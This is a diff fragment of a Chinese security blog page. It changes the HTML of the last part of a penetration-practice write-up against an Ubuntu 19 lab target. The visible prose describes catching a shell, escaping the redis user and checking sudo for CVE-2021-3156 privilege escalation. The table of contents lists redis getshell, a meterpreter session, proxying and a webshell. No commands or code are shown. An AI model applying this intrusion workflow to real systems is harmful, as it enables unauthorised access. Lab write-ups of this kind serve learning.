+<p>这里先运行脚本进行监听，然后使用 <strong>甜甜圈</strong> 弹个shell：<br><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315114846.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315114846324"></p>
 <p>OK，这里是成功了，不妨 <code>ls /tmp</code> 试试：</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315114939.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315114938968"></p>
 <p>成功逃逸了，那么下一步即可以是提权了。</p>
-<h4 id="CVE权限提升">- CVE权限提升 -</h4>
-<p>先看一下当前 <strong>靶机</strong> 的信息吧：</p>
+<h4 id="CVE权限提升"><a href="#CVE权限提升" class="headerlink" title="- CVE权限提升 -"></a>- CVE权限提升 -</h4><p>先看一下当前 <strong>靶机</strong> 的信息吧：</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315115122.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315115122264"></p>
 <p>这是一个 <strong>ubuntu19</strong> 的系统，此时可以想到 <strong>CVE2021-3156</strong> 即 <strong>sudo权限提升漏洞</strong> 。可以检查以下 <strong>sudo</strong> 的版本：</p>
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315115628.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315115628741"></p>
@@ -693,8 +675,7 @@
 <p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315120730.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315120730897"></p>
 <p>那么就拿下了 <strong>ubuntu19</strong> ，emmm还有个小彩蛋。</p>
 <hr>
-<h2 id="总结">- 总结 -</h2>
-<p>咋说呢，说起来 <strong>redis</strong> 外网泄露确实是很不安全的，这可不能够忽视啊。同时关于对 <strong>redis</strong> 用户逃逸，确实是还蛮巧妙的，哈哈哈。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="- 总结 -"></a>- 总结 -</h2><p>咋说呢，说起来 <strong>redis</strong> 外网泄露确实是很不安全的，这可不能够忽视啊。同时关于对 <strong>redis</strong> 用户逃逸，确实是还蛮巧妙的，哈哈哈。</p>
 
 
         <hr>
@@ -702,7 +683,7 @@
         <ul class="pager">
           
           <li class="previous">
-            <a href="/2021/12/27/cn/说明 - socat的简单使用/" data-toggle="tooltip" data-placement="top" title="说明 - socat的简单使用">&larr; Previous Post</a>
+            <a href="/2021/12/27/cn/编程 - 编程实现带参数执行模式防SQL注入/" data-toggle="tooltip" data-placement="top" title="编程 - 编程实现带参数执行模式防SQL注入">&larr; Previous Post</a>
           </li>
           
           
@@ -840,7 +821,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">练习 - Ubuntu19渗透</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%9B%AE%E6%A0%87%E9%85%8D%E7%BD%AE"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">- 目标配置 -</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">- 具体步骤 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-getshell"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">- 信息搜集 &amp; getshell -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#21%E7%AB%AF%E5%8F%A3-ftp"><span class="toc-nav-number">1.2.1.1.</span> <span class="toc-nav-text">- 21端口 (ftp) -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#22%E7%AB%AF%E5%8F%A3-ssh"><span class="toc-nav-number">1.2.1.2.</span> <span class="toc-nav-text">- 22端口 (ssh) -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#80%E7%AB%AF%E5%8F%A3-http"><span class="toc-nav-number">1.2.1.3.</span> <span class="toc-nav-text">- 80端口 (http) -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#6379%E7%AB%AF%E5%8F%A3-getshell-redis"><span class="toc-nav-number">1.2.1.4.</span> <span class="toc-nav-text">- 6379端口 &amp; getshell (redis) -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">- 横向移动 &amp; 权限提升 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#msf-%E8%8E%B7%E5%8F%96-metershell"><span class="toc-nav-number">1.2.2.1.</span> <span class="toc-nav-text">- msf 获取 metershell -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%BC%80%E5%90%AF%E4%BB%A3%E7%90%86"><span class="toc-nav-number">1.2.2.2.</span> <span class="toc-nav-text">- 开启代理 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%8E%B7%E5%8F%96-webshell"><span class="toc-nav-number">1.2.2.3.</span> <span class="toc-nav-text">- 获取 webshell -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-nav-number">1.2.2.4.</span> <span class="toc-nav-text">- CVE权限提升 -</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">- 总结 -</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#%E7%BB%83%E4%B9%A0-Ubuntu19%E6%B8%97%E9%80%8F"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">练习 - Ubuntu19渗透</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%9B%AE%E6%A0%87%E9%85%8D%E7%BD%AE"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">- 目标配置 -</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">- 具体步骤 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-amp-getshell"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">- 信息搜集 &amp; getshell -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#21%E7%AB%AF%E5%8F%A3-ftp"><span class="toc-nav-number">1.2.1.1.</span> <span class="toc-nav-text">- 21端口 (ftp) -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#22%E7%AB%AF%E5%8F%A3-ssh"><span class="toc-nav-number">1.2.1.2.</span> <span class="toc-nav-text">- 22端口 (ssh) -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#80%E7%AB%AF%E5%8F%A3-http"><span class="toc-nav-number">1.2.1.3.</span> <span class="toc-nav-text">- 80端口 (http) -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#6379%E7%AB%AF%E5%8F%A3-amp-getshell-redis"><span class="toc-nav-number">1.2.1.4.</span> <span class="toc-nav-text">- 6379端口 &amp; getshell (redis) -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-amp-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">- 横向移动 &amp; 权限提升 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#msf-%E8%8E%B7%E5%8F%96-metershell"><span class="toc-nav-number">1.2.2.1.</span> <span class="toc-nav-text">- msf 获取 metershell -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%BC%80%E5%90%AF%E4%BB%A3%E7%90%86"><span class="toc-nav-number">1.2.2.2.</span> <span class="toc-nav-text">- 开启代理 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%8E%B7%E5%8F%96-webshell"><span class="toc-nav-number">1.2.2.3.</span> <span class="toc-nav-text">- 获取 webshell -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-nav-number">1.2.2.4.</span> <span class="toc-nav-text">- CVE权限提升 -</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">- 总结 -</span></a></li></ol></li></ol>
         
         </div>
       </aside>
